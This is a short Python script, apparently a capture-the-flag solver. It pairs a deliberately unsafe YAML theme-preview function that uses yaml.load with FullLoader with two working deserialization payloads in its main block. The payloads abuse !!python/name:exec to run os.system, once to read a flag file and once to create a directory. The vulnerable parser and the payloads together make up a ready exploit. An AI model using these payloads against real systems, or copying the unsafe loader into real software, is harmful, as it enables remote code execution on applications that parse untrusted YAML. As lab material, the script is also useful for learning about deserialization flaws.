import yaml
from typing import Any, Dict

def validate_color(color_value: str) -> str:
    return color_value if isinstance(color_value, str) else "#336699"

def write_theme_css(colors: Dict[str, str]) -> None:
    print("[*] write_theme_css called with:")
    print(f"    primary: {colors.get('primary')}")
    print(f"    accent: {colors.get('accent')}")

def preview_theme(body: str):
    print(len(body))
    if len(body) > 2**8:
        
        return {"error": "Body is too long"}

    try:
        parsed: Any = yaml.load(body, Loader=yaml.FullLoader)
        print(parsed)
        colors: Dict[str, str] = {}
        if isinstance(parsed, dict) and isinstance(parsed.get("colors"), dict):
            colors = {
                "primary": str(parsed["colors"].get("primary", "#336699")),
                "accent": str(parsed["colors"].get("accent", "#88aadd")),
            }
        write_theme_css(colors)
    except Exception as e:
        print(f"[!] Exception during YAML parsing: {e}")
        write_theme_css({"primary": "#336699", "accent": "#88aadd"})

    try:
        return {"ok": repr(parsed)}
    except Exception:
        return {"error": "Failed to parse YAML"}


# ================================ÃŸ
# Test Payload Here
# ================================

if __name__ == "__main__":
    payload = """!!python/object/new:type {args:["z",!!python/tuple [],{"extend":!!python/name:exec}],listitems:"__import__('os').system('cat</flag>x')"}"""

    payload = """
!!python/object/new:type
args:
  - "z"
  - !!python/tuple []
  - 
    extend: !!python/name:exec
listitems: "__import__('os').system('mkdir HACKED')"
    """
    result = preview_theme(payload)
    print(result)
